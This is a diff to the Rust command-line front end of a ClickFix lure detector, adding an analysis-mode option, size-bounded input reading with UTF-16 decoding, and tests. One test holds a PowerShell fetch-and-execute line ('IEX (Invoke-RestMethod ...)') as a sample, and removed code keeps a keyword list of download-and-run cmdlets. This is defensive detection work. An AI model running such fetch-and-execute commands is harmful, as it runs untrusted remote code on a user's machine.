@@ -1,7 +1,7 @@
 use clap::{Parser, ValueEnum};
 use clickfix_detect::{
-    render_human, AnalysisReport, Detector, DetectorInput, InputKind, PrefilterDecision,
-    SafeSourcePolicy,
+    render_human, AnalysisMode, AnalysisReport, Detector, DetectorInput, InputKind,
+    SafeSourcePolicy, MAX_DETECTOR_INPUT_BYTES,
 };
 use emulator_core::{AnalysisLimits, NetworkPolicy};
 use rustyline::{error::ReadlineError, DefaultEditor};
@@ -29,6 +29,10 @@ struct Arguments {
     /// Select human-readable or JSON output.
     #[arg(long, value_enum, default_value = "human")]
     format: OutputFormat,
+
+    /// Select hot-path prefiltering or unconditional thorough analysis.
+    #[arg(long, value_enum, default_value = "hot-path")]
+    analysis_mode: CliAnalysisMode,
 
     /// Maximum emulation steps.
     #[arg(long, default_value_t = 20_000)]
@@ -72,6 +76,21 @@ enum OutputFormat {
     Json,
 }
 
+#[derive(Debug, Clone, Copy, ValueEnum)]
+enum CliAnalysisMode {
+    HotPath,
+    Thorough,
+}
+
+impl From<CliAnalysisMode> for AnalysisMode {
+    fn from(mode: CliAnalysisMode) -> Self {
+        match mode {
+            CliAnalysisMode::HotPath => Self::HotPath,
+            CliAnalysisMode::Thorough => Self::Thorough,
+        }
+    }
+}
+
 fn main() {
     if let Err(error) = run() {
         eprintln!("clickfix-detect: {error}");
@@ -90,7 +109,10 @@ fn run() -> Result<(), Box<dyn std::error::Error>> {
     let (content, path) = read_input(&arguments)?;
     let kind = select_kind(arguments.kind, &content, path.as_ref());
     let detector = create_detector(&arguments)?;
-    let report = detector.analyze(DetectorInput { kind, content })?;
+    let report = detector.analyze_with_mode(
+        DetectorInput { kind, content },
+        arguments.analysis_mode.into(),
+    )?;
     print_report(&report, arguments.format, false)?;
     Ok(())
 }
@@ -164,6 +186,12 @@ fn run_terminal_interactive(
                 ReplAction::Continue => {}
                 ReplAction::Help => print_interactive_help(),
                 ReplAction::Exit => break,
+                ReplAction::Oversized => {
+                    eprintln!(
+                        "clickfix-detect: detector input exceeds the {MAX_DETECTOR_INPUT_BYTES} byte limit"
+                    );
+                    buffer.clear();
+                }
                 ReplAction::Evaluate => {
                     let entry = buffer.trim_end().to_owned();
                     if !entry.is_empty() {
@@ -205,6 +233,12 @@ fn run_stream_interactive(
             ReplAction::Continue => {}
             ReplAction::Help => print_interactive_help(),
             ReplAction::Exit => break,
+            ReplAction::Oversized => {
+                eprintln!(
+                    "clickfix-detect: detector input exceeds the {MAX_DETECTOR_INPUT_BYTES} byte limit"
+                );
+                buffer.clear();
+            }
             ReplAction::Evaluate => {
                 evaluate_interactive(arguments, detector, &buffer);
                 buffer.clear();
@@ -219,6 +253,7 @@ enum ReplAction {
     Continue,
     Help,
     Exit,
+    Oversized,
     Evaluate,
 }
 
@@ -230,6 +265,9 @@ fn accept_interactive_line(line: &str, buffer: &mut String) -> ReplAction {
     }
     if buffer.is_empty() && trimmed.eq_ignore_ascii_case(":help") {
         return ReplAction::Help;
+    }
+    if buffer.len().saturating_add(line.len()) > MAX_DETECTOR_INPUT_BYTES {
+        return ReplAction::Oversized;
     }
     buffer.push_str(line);
     if !line.ends_with('\n') {
@@ -284,10 +322,13 @@ fn input_is_complete(input: &str) -> bool {
 
 fn evaluate_interactive(arguments: &Arguments, detector: &Detector, content: &str) {
     let kind = select_kind(arguments.kind, content, None);
-    match detector.analyze(DetectorInput {
-        kind,
-        content: content.to_owned(),
-    }) {
+    match detector.analyze_with_mode(
+        DetectorInput {
+            kind,
+            content: content.to_owned(),
+        },
+        arguments.analysis_mode.into(),
+    ) {
         Ok(report) => {
             if let Err(error) = print_report(&report, arguments.format, true) {
                 eprintln!("clickfix-detect: {error}");
@@ -312,46 +353,71 @@ fn matches_ignore_ascii_case(value: &str, candidates: &[&str]) -> bool {
 
 fn read_input(arguments: &Arguments) -> Result<(String, Option<PathBuf>), io::Error> {
     if let Some(path) = &arguments.file {
-        return std::fs::read_to_string(path).map(|content| (content, Some(path.clone())));
+        let file = std::fs::File::open(path)?;
+        return read_bounded_text(file).map(|content| (content, Some(path.clone())));
     }
     if let Some(input) = &arguments.input {
         return Ok((input.clone(), None));
     }
-    let mut input = String::new();
-    io::stdin().read_to_string(&mut input)?;
-    Ok((input, None))
+    read_bounded_text(io::stdin().lock()).map(|input| (input, None))
+}
+
+fn read_bounded_text(reader: impl Read) -> Result<String, io::Error> {
+    let mut bytes = Vec::new();
+    reader
+        .take(MAX_DETECTOR_INPUT_BYTES.saturating_add(1) as u64)
+        .read_to_end(&mut bytes)?;
+    if bytes.len() > MAX_DETECTOR_INPUT_BYTES {
+        return Err(io::Error::new(
+            io::ErrorKind::InvalidData,
+            format!("detector input exceeds the {MAX_DETECTOR_INPUT_BYTES} byte limit"),
+        ));
+    }
+    decode_text(bytes)
+}
+
+fn decode_text(bytes: Vec<u8>) -> Result<String, io::Error> {
+    if let Some(bytes) = bytes.strip_prefix(&[0xef, 0xbb, 0xbf]) {
+        return String::from_utf8(bytes.to_vec())
+            .map_err(|error| io::Error::new(io::ErrorKind::InvalidData, error));
+    }
+    if let Some(bytes) = bytes.strip_prefix(&[0xff, 0xfe]) {
+        return decode_utf16(bytes, u16::from_le_bytes);
+    }
+    if let Some(bytes) = bytes.strip_prefix(&[0xfe, 0xff]) {
+        return decode_utf16(bytes, u16::from_be_bytes);
+    }
+    String::from_utf8(bytes).map_err(|error| io::Error::new(io::ErrorKind::InvalidData, error))
+}
+
+fn decode_utf16(bytes: &[u8], decode: fn([u8; 2]) -> u16) -> Result<String, io::Error> {
+    if bytes.len() % 2 != 0 {
+        return Err(io::Error::new(
+            io::ErrorKind::InvalidData,
+            "UTF-16 input has an incomplete code unit",
+        ));
+    }
+    let units = bytes
+        .chunks_exact(2)
+        .map(|chunk| decode([chunk[0], chunk[1]]))
+        .collect::<Vec<_>>();
+    String::from_utf16(&units).map_err(|error| io::Error::new(io::ErrorKind::InvalidData, error))
 }
 
 fn select_kind(kind: CliInputKind, content: &str, path: Option<&PathBuf>) -> InputKind {
     match kind {
         CliInputKind::Command => InputKind::RawCommand,
         CliInputKind::Powershell => InputKind::PowerShellScript,
-        CliInputKind::Auto => infer_kind(content, path),
-    }
-}
-
-fn infer_kind(content: &str, path: Option<&PathBuf>) -> InputKind {
-    if path.is_some_and(|path| {
-        path.extension()
-            .is_some_and(|extension| extension.eq_ignore_ascii_case("ps1"))
-    }) {
-        return InputKind::PowerShellScript;
-    }
-    if Detector::prefilter(content).decision == PrefilterDecision::DefinitelyBenign {
-        return InputKind::RawCommand;
-    }
-    let lowercase = content.to_ascii_lowercase();
-    if content.contains('\n')
-        || content.trim_start().starts_with('$')
-        || lowercase.contains("invoke-webrequest")
-        || lowercase.contains("invoke-expression")
-        || lowercase.contains("set-content")
-        || lowercase.contains("[system.")
-        || lowercase.contains("[text.")
-    {
-        InputKind::PowerShellScript
-    } else {
-        InputKind::RawCommand
+        CliInputKind::Auto => {
+            if path.is_some_and(|path| {
+                path.extension()
+                    .is_some_and(|extension| extension.eq_ignore_ascii_case("ps1"))
+            }) {
+                InputKind::PowerShellScript
+            } else {
+                Detector::infer_input_kind(content)
+            }
+        }
     }
 }
 
@@ -359,6 +425,7 @@ fn infer_kind(content: &str, path: Option<&PathBuf>) -> InputKind {
 mod tests {
     use super::*;
     use rustyline::history::{History, SearchDirection};
+    use std::io::Cursor;
 
     #[test]
     fn line_editor_retains_history() {
@@ -385,5 +452,36 @@ mod tests {
         assert!(input_is_complete(
             "powershell.exe -c \"IEX (\nInvoke-RestMethod 'https://example.invalid'\n)\"\n"
         ));
+    }
+
+    #[test]
+    fn bounded_reader_decodes_utf8_and_utf16_boms() {
+        assert_eq!(
+            read_bounded_text(Cursor::new(b"\xef\xbb\xbfWrite-Output safe")).unwrap(),
+            "Write-Output safe"
+        );
+        let utf16le = [0xff, 0xfe, b'O', 0, b'K', 0];
+        assert_eq!(read_bounded_text(Cursor::new(utf16le)).unwrap(), "OK");
+    }
+
+    #[test]
+    fn bounded_reader_rejects_oversized_input() {
+        let input = vec![b'A'; MAX_DETECTOR_INPUT_BYTES + 1];
+        let error = read_bounded_text(Cursor::new(input)).unwrap_err();
+
+        assert_eq!(error.kind(), io::ErrorKind::InvalidData);
+        assert!(error.to_string().contains("exceeds"));
+    }
+
+    #[test]
+    fn automatic_kind_inference_is_shared_with_the_library() {
+        assert_eq!(
+            select_kind(
+                CliInputKind::Auto,
+                "Invoke-RestMethod https://example.invalid",
+                None,
+            ),
+            InputKind::PowerShellScript
+        );
     }
 }
